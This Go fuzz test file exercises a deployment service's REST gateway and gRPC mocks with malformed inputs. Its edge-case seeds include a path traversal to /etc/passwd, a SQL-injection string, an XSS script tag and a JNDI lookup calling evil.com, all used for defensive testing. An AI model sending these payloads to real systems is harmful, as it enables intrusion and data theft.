// SPDX-FileCopyrightText: (C) 2024 Intel Corporation
//
// SPDX-License-Identifier: Apache-2.0

package fuzztests

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	"go.uber.org/mock/gomock"
	"google.golang.org/grpc"
	"google.golang.org/protobuf/types/known/emptypb"

	deploymentpb "github.com/open-edge-platform/app-orch-deployment/app-deployment-manager/api/nbi/v2/deployment/v1"
	"github.com/open-edge-platform/app-orch-deployment/app-deployment-manager/api/nbi/v2/pkg/restClient"
	"github.com/open-edge-platform/app-orch-deployment/app-deployment-manager/internal/northbound/mocks"
	"github.com/open-edge-platform/app-orch-deployment/app-deployment-manager/internal/restproxy"
	libnorthbound "github.com/open-edge-platform/orch-library/go/pkg/northbound"
)

type FuzzTestSuiteRest struct {
	client *restClient.ClientWithResponses
	mock   *mocks.MockDeploymentServiceServer
	gwport uint16
}

// Service wrapper to implement the Service interface
type mockServiceWrapper struct {
	mock *mocks.MockDeploymentServiceServer
}

func (w *mockServiceWrapper) Register(grpcServer *grpc.Server) {
	deploymentpb.RegisterDeploymentServiceServer(grpcServer, w.mock)
}

var (
	allowedCorsOrigins string = ""
	basePath           string = ""
)

func getFreePort() (port int, err error) {
	var a *net.TCPAddr
	if a, err = net.ResolveTCPAddr("tcp", "localhost:0"); err == nil {
		var l *net.TCPListener
		if l, err = net.ListenTCP("tcp", a); err == nil {
			defer l.Close()
			return l.Addr().(*net.TCPAddr).Port, nil
		}
	}
	return
}

func setupFuzzTestREST(f testing.TB) *FuzzTestSuiteRest {
	t := &testing.T{}
	s := &FuzzTestSuiteRest{}
	os.Setenv("MSG_SIZE_LIMIT", "1")

	ctrl := gomock.NewController(t)
	s.mock = mocks.NewMockDeploymentServiceServer(ctrl)

	// Use fixed gRPC port
	grpcPort := 8080
	grpcAddr := fmt.Sprintf("localhost:%d", grpcPort)

	gwAddr, err := getFreePort()
	require.NoError(f, err)
	s.gwport = uint16(gwAddr)

	serverConfig := libnorthbound.NewInsecureServerConfig(int16(grpcPort))
	srv := libnorthbound.NewServer(serverConfig)
	srv.AddService(&mockServiceWrapper{mock: s.mock})
	doneCh := make(chan error)
	go func() {
		err := srv.Serve(func(started string) {
			f.Log("gRPC server started on port", started)
			close(doneCh)
		}, grpc.MaxRecvMsgSize(1*1024*1024))
		if err != nil {
			doneCh <- err
		}
	}()

	f.Cleanup(func() {
		srv.Stop()
	})

	go func() {
		f.Logf("gRPC gateway started on port %v", gwAddr)
		err := restproxy.Run(grpcAddr, gwAddr, allowedCorsOrigins, basePath, "../../../api/nbi/v2/spec/openapi.yaml")
		require.NoError(f, err)
	}()

	s.client, err = restClient.NewClientWithResponses(fmt.Sprintf("http://localhost:%d", gwAddr))
	require.NoError(f, err)

	// Wait until the gateway is ready
	require.Eventually(f, func() bool {
		resp, err := http.Get(fmt.Sprintf("http://localhost:%d/healthz", gwAddr))
		if err != nil {
			return false
		}
		if resp.StatusCode != http.StatusOK {
			return false
		}
		return true
	}, time.Second*10, time.Millisecond*500)

	return s
}

func FuzzRESTRouter(f *testing.F) {
	s := setupFuzzTestREST(f)

	s.mock.EXPECT().ListDeployments(gomock.Any(), gomock.Any()).Return(&deploymentpb.ListDeploymentsResponse{}, nil).AnyTimes()

	f.Add("GET", "", "", "")
	f.Add("GET", "/", "Accept-Encoding", "gzip")
	f.Add("GET", "/", "Authorization", "Bearer token")
	f.Add("GET", "/healthz", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "Authorization", "Bearer token")
	f.Add("DELETE", "/deployment.orchestrator.apis/v1/deployments", "", "")
	f.Add("PUT", "/deployment.orchestrator.apis/v1/deployments", "", "")

	// Additional corner cases
	f.Add("POST", "/deployment.orchestrator.apis/v1/deployments", "Content-Type", "application/json")
	f.Add("PATCH", "/deployment.orchestrator.apis/v1/deployments/test-id", "Content-Type", "application/json")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments/test-id", "", "")
	f.Add("DELETE", "/deployment.orchestrator.apis/v1/deployments/test-id", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployment-clusters", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments-status", "", "")

	// Edge cases for path manipulation
	f.Add("GET", "/../", "", "")
	f.Add("GET", "/./", "", "")
	f.Add("GET", "//", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments/../deployments", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments/./test", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments//test", "", "")

	// Header edge cases
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "Content-Length", "-1")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "Transfer-Encoding", "chunked")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "Connection", "close")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "X-Forwarded-For", "127.0.0.1")

	// Invalid/malformed requests
	f.Add("", "/deployment.orchestrator.apis/v1/deployments", "", "")
	f.Add("INVALID", "/deployment.orchestrator.apis/v1/deployments", "", "")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "", "\x00\x01\x02")
	f.Add("GET", "/deployment.orchestrator.apis/v1/deployments", "\x00header", "value")

	f.Fuzz(func(t *testing.T, m, p, h, a string) {
		ctx, cancel := context.WithDeadline(context.Background(), time.Now().Add(time.Second*5))
		defer cancel()

		req, err := http.NewRequestWithContext(ctx, m, fmt.Sprintf("http://localhost:%v", s.gwport), nil)
		if err != nil {
			return
		}

		// Bypass URL parsing to allow malformed paths
		req.URL.Path = p
		req.Header.Set(h, a)

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			return
		}

		if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound &&
			resp.StatusCode != http.StatusBadRequest && resp.StatusCode != http.StatusNotImplemented &&
			resp.StatusCode != http.StatusMethodNotAllowed && resp.StatusCode != http.StatusInternalServerError {
			require.Failf(t, "unexpected response", "%v --> status %v code %v", resp.Request.URL.String(), resp.StatusCode, resp.Status)
		}

		_, err = io.Copy(io.Discard, resp.Body)
		if err != nil {
			return
		}
		_ = resp.Body.Close()
	})
}

// Direct gRPC fuzzing for northbound endpoints
func FuzzNorthboundEndpoints(f *testing.F) {
	ctrl := gomock.NewController(&testing.T{})
	mock := mocks.NewMockDeploymentServiceServer(ctrl)

	mock.EXPECT().ListDeployments(gomock.Any(), gomock.Any()).Return(&deploymentpb.ListDeploymentsResponse{}, nil).AnyTimes()
	mock.EXPECT().ListDeploymentClusters(gomock.Any(), gomock.Any()).Return(&deploymentpb.ListDeploymentClustersResponse{}, nil).AnyTimes()
	mock.EXPECT().GetDeployment(gomock.Any(), gomock.Any()).Return(&deploymentpb.GetDeploymentResponse{}, nil).AnyTimes()
	mock.EXPECT().GetDeploymentsStatus(gomock.Any(), gomock.Any()).Return(&deploymentpb.GetDeploymentsStatusResponse{}, nil).AnyTimes()
	mock.EXPECT().CreateDeployment(gomock.Any(), gomock.Any()).Return(&deploymentpb.CreateDeploymentResponse{}, nil).AnyTimes()
	mock.EXPECT().UpdateDeployment(gomock.Any(), gomock.Any()).Return(&deploymentpb.UpdateDeploymentResponse{}, nil).AnyTimes()
	mock.EXPECT().DeleteDeployment(gomock.Any(), gomock.Any()).Return(&emptypb.Empty{}, nil).AnyTimes()
	mock.EXPECT().ListDeploymentsPerCluster(gomock.Any(), gomock.Any()).Return(&deploymentpb.ListDeploymentsPerClusterResponse{}, nil).AnyTimes()
	mock.EXPECT().GetAppNamespace(gomock.Any(), gomock.Any()).Return(&deploymentpb.GetAppNamespaceResponse{}, nil).AnyTimes()

	// Basic seed values for different request patterns
	f.Add("", "") // Empty values
	f.Add("test-deployment", "env=prod")
	f.Add("deployment-with-long-name-that-might-exceed-limits", "app=test")
	f.Add("test", "team=backend") // Short names

	// Special characters and edge cases
	f.Add("deployment-with-special-chars", "label=special")
	f.Add("deployment-with-dashes", "env=staging")
	f.Add("deployment-with-dots", "version=1.0")
	f.Add("deployment-unicode", "unicode=test")

	f.Fuzz(func(t *testing.T, deploymentId, labels string) {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second*2)
		defer cancel()

		// Test ListDeployments - uses labels
		listReq := &deploymentpb.ListDeploymentsRequest{}
		if labels != "" {
			listReq.Labels = []string{labels}
		}
		_, err := mock.ListDeployments(ctx, listReq)
		if err != nil {
			t.Logf("ListDeployments error (expected): %v", err)
		}

		// Test GetDeployment with fuzzed input
		if deploymentId != "" {
			getReq := &deploymentpb.GetDeploymentRequest{
				DeplId: deploymentId,
			}
			_, err := mock.GetDeployment(ctx, getReq)
			if err != nil {
				t.Logf("GetDeployment error (expected): %v", err)
			}
		}

		// Test ListDeploymentClusters
		listClustersReq := &deploymentpb.ListDeploymentClustersRequest{}
		_, err = mock.ListDeploymentClusters(ctx, listClustersReq)
		if err != nil {
			t.Logf("ListDeploymentClusters error (expected): %v", err)
		}

		// Test CreateDeployment
		if deploymentId != "" {
			createReq := &deploymentpb.CreateDeploymentRequest{
				Deployment: &deploymentpb.Deployment{
					AppName: deploymentId,
				},
			}
			_, err := mock.CreateDeployment(ctx, createReq)
			if err != nil {
				t.Logf("CreateDeployment error (expected): %v", err)
			}
		}

		// Test GetDeploymentsStatus
		statusReq := &deploymentpb.GetDeploymentsStatusRequest{}
		_, err = mock.GetDeploymentsStatus(ctx, statusReq)
		if err != nil {
			t.Logf("GetDeploymentsStatus error (expected): %v", err)
		}
	})
}

// Test specific input patterns for edge cases
func FuzzNorthboundEdgeCases(f *testing.F) {
	ctrl := gomock.NewController(&testing.T{})
	mock := mocks.NewMockDeploymentServiceServer(ctrl)

	// Set up mocks to handle any input gracefully
	mock.EXPECT().GetDeployment(gomock.Any(), gomock.Any()).Return(&deploymentpb.GetDeploymentResponse{}, nil).AnyTimes()
	mock.EXPECT().ListDeployments(gomock.Any(), gomock.Any()).Return(&deploymentpb.ListDeploymentsResponse{}, nil).AnyTimes()

	// Edge case seed values
	f.Add("")                                                                                                                                                                                                                // Empty string
	f.Add("\x00")                                                                                                                                                                                                            // Null byte
	f.Add("\x00\x01\x02\x03")                                                                                                                                                                                                // Binary data
	f.Add("deployment\x00with\x00nulls")                                                                                                                                                                                     // Embedded nulls
	f.Add("very-long-deployment-name-that-exceeds-kubernetes-name-limits-and-might-cause-issues-when-processing-the-request-in-the-backend-services-especially-when-dealing-with-database-storage-and-api-validation-rules") // Very long name
	f.Add("../../../etc/passwd")                                                                                                                                                                                             // Path traversal
	f.Add("'; DROP TABLE deployments; --")                                                                                                                                                                                   // SQL injection-like
	f.Add("<script>alert('xss')</script>")                                                                                                                                                                                   // XSS-like
	f.Add("${jndi:ldap://evil.com/exploit}")                                                                                                                                                                                 // JNDI injection-like
	f.Add("\n\r\t")                                                                                                                                                                                                          // Control characters
	f.Add("deployment name with spaces")                                                                                                                                                                                     // Spaces (invalid in k8s)
	f.Add("DEPLOYMENT_UPPERCASE")                                                                                                                                                                                            // Uppercase (invalid in k8s)
	f.Add("deployment-ending-with-dash-")                                                                                                                                                                                    // Invalid k8s ending
	f.Add("-deployment-starting-with-dash")                                                                                                                                                                                  // Invalid k8s starting
	f.Add("deployment..double.dots")                                                                                                                                                                                         // Double dots
	f.Add("deployment---triple-dashes")                                                                                                                                                                                      // Triple dashes

	f.Fuzz(func(t *testing.T, name string) {
		ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*500)
		defer cancel()

		// Test that the service handles malformed input gracefully
		req := &deploymentpb.GetDeploymentRequest{
			DeplId: name,
		}

		// We expect this to either succeed or fail gracefully
		// The important thing is that it doesn't panic or hang
		_, err := mock.GetDeployment(ctx, req)

		if err != nil {
			t.Logf("Expected error for input %q: %v", name, err)
		}

		// Also test as label
		listReq := &deploymentpb.ListDeploymentsRequest{}
		if name != "" {
			listReq.Labels = []string{name}
		}
		_, err = mock.ListDeployments(ctx, listReq)
		if err != nil {
			t.Logf("Expected error for label %q: %v", name, err)
		}
	})
}
